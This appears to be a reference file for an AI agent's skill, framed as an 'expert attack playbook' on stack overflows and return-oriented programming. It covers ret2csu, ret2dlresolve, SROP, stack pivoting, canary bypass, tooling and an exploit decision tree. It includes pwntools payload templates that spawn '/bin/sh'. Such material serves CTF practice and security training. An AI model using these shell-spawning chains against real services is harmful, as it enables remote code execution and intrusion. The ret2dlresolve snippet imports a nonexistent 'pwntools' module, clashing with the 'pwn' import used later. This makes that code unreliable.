# SKILL: Stack Overflow & ROP — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [4. ret2csu — Universal 3-Argument Control](#4-ret2csu-universal-3-argument-control)
- [5. ret2dlresolve](#5-ret2dlresolve)
- [6. SROP — Sigreturn-Oriented Programming](#6-srop-sigreturn-oriented-programming)
- [7. STACK PIVOTING](#7-stack-pivoting)
- [8. CANARY BYPASS](#8-canary-bypass)
- [9. TOOLS QUICK REFERENCE](#9-tools-quick-reference)
- [10. DECISION TREE](#10-decision-tree)
<!-- zhiyugo:toc:end -->

## 4. ret2csu — Universal 3-Argument Control

`__libc_csu_init` exists in nearly all dynamically linked ELF binaries and provides controlled calls with up to 3 arguments.

```nasm
; Gadget 1 (csu_init + 0x3a): pop registers
pop rbx     ; 0
pop rbp     ; 1
pop r12     ; call target (function pointer address)
pop r13     ; arg3 (rdx)
pop r14     ; arg2 (rsi)
pop r15     ; arg1 (edi = r15d)
ret

; Gadget 2 (csu_init + 0x20): controlled call
mov rdx, r13
mov rsi, r14
mov edi, r15d    ; NOTE: only sets edi (32-bit), not full rdi
call [r12 + rbx*8]
add rbx, 1
cmp rbp, rbx
jne <loop>
; falls through to gadget 1 again
```

**Key constraints**: r12 must point to a **pointer** to the target function (e.g., GOT entry), not the function address directly. Set `rbx=0`, `rbp=1` to skip the loop.

---

## 5. ret2dlresolve

Forge ELF dynamic linking structures to resolve an arbitrary function (e.g., `system`) without a libc leak.

### Attack Flow

1. Control execution to call `_dl_runtime_resolve(link_map, reloc_offset)`
2. Forge `Elf_Rel` at known writable address pointing to fake `Elf_Sym`
3. Forge `Elf_Sym` with `st_name` pointing to fake string `"system\x00"`
4. Set `reloc_offset` so resolver uses forged structures
5. Argument (`/bin/sh`) placed on stack or in known buffer

```python
# pwntools automation (recommended)
from pwntools import *
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
io.sendline(rop.chain())
io.sendline(dlresolve.payload)
```

### 32-bit vs 64-bit Differences

| Aspect | 32-bit | 64-bit |
|---|---|---|
| Relocation type | `Elf32_Rel` (8 bytes) | `Elf64_Rela` (24 bytes) |
| Symbol table entry | `Elf32_Sym` (16 bytes) | `Elf64_Sym` (24 bytes) |
| Alignment | Relaxed | Strict (must satisfy `ndx = (reloc_offset) / sizeof(Elf64_Rela)`, then `sym = symtab[ndx]`) |
| Version check | Usually skippable | `VERSYM[sym_index]` must be valid or 0 |

---

## 6. SROP — Sigreturn-Oriented Programming

Abuse the `sigreturn` syscall to set **all registers at once** from a fake Signal Frame on the stack.

```python
from pwn import *
frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret_addr
frame.rsp = new_stack_addr  # optional pivot

payload = b'A' * offset
payload += p64(pop_rax_ret) + p64(15)  # SYS_rt_sigreturn = 15
payload += p64(syscall_ret)
payload += bytes(frame)
```

**When to use**: limited gadgets, no `pop rdx`, static binary, or need to pivot stack to arbitrary address.

---

## 7. STACK PIVOTING

Move the stack pointer to an attacker-controlled buffer when overflow length is limited.

| Technique | Gadget | Precondition |
|---|---|---|
| `leave; ret` | `mov rsp, rbp; pop rbp; ret` | Control saved RBP to point to fake stack |
| `xchg rsp, rax; ret` | Swap RSP with RAX | Control RAX (via gadget chain) |
| `pop rsp; ret` | Direct RSP control | Rare but powerful |
| SROP pivot | Set RSP in SigreturnFrame | Only need sigreturn gadget |

### leave;ret Pivot Pattern

```
Overflow: [AAAA...][fake_rbp → buf][leave_ret_addr]
  1st leave: rsp = rbp → fake_rbp;  pop rbp → *fake_rbp
  1st ret:   rip = leave_ret_addr
  2nd leave: rsp = new_rbp → buf+8; pop rbp → *(buf)
  2nd ret:   rip = *(buf+8) → start of ROP chain in buf
```

---

## 8. CANARY BYPASS

| Technique | Condition | Method |
|---|---|---|
| Brute-force | `fork()` server (canary same in child) | Byte-by-byte (256 × 7 = 1792 attempts for 64-bit) |
| Format string leak | printf(user_input) available | `%N$p` to read canary from stack |
| Stack reading | One-byte overflow or partial read | Overwrite canary null byte, read via error/output |
| Thread canary | Overflow reaches TLS | Overwrite `stack_guard` in TLS (at `fs:[0x28]`) simultaneously |
| Information disclosure | Uninitialized stack variable leak | Canary included in leaked data |

---

## 9. TOOLS QUICK REFERENCE

```bash
checksec ./binary                          # Show protections (NX, canary, PIE, RELRO)
ROPgadget --binary ./binary --ropchain     # Auto-generate ROP chain
ropper -f ./binary --search "pop rdi"      # Semantic gadget search
one_gadget ./libc.so.6                     # Find one-shot RCE gadgets
pwn template ./binary --host x --port y    # Generate pwntools exploit skeleton
```

---

## 10. DECISION TREE

```
Binary has stack overflow?
├── checksec: NX disabled?
│   └── YES → shellcode on stack, ret to buffer (ret2shellcode)
│   └── NO (NX enabled) →
│       ├── Canary enabled?
│       │   ├── YES → fork() server? → brute-force canary
│       │   │         format string? → leak canary
│       │   │         info leak?     → read canary
│       │   └── NO → proceed to ROP
│       ├── ASLR/PIE enabled?
│       │   ├── PIE → leak code base (partial overwrite last 12 bits, or info leak)
│       │   ├── ASLR only → leak libc base (puts@GOT, write@GOT)
│       │   └── Neither → addresses known, direct ROP
│       ├── Can leak libc?
│       │   ├── YES → ret2libc (system/execve) or one_gadget
│       │   └── NO → ret2dlresolve (forge resolution) or SROP
│       ├── Need 3+ args but no pop rdx?
│       │   └── ret2csu or SROP
│       ├── Overflow too short for full chain?
│       │   └── Stack pivot (leave;ret, xchg rsp)
│       ├── Static binary (no libc)?
│       │   └── SROP + syscall chain (execve via sigreturn)
│       └── Full RELRO?
│           └── Cannot overwrite GOT → target __free_hook, __malloc_hook,
│               or _IO_FILE vtable (see ../arbitrary-write-to-rce/)
```
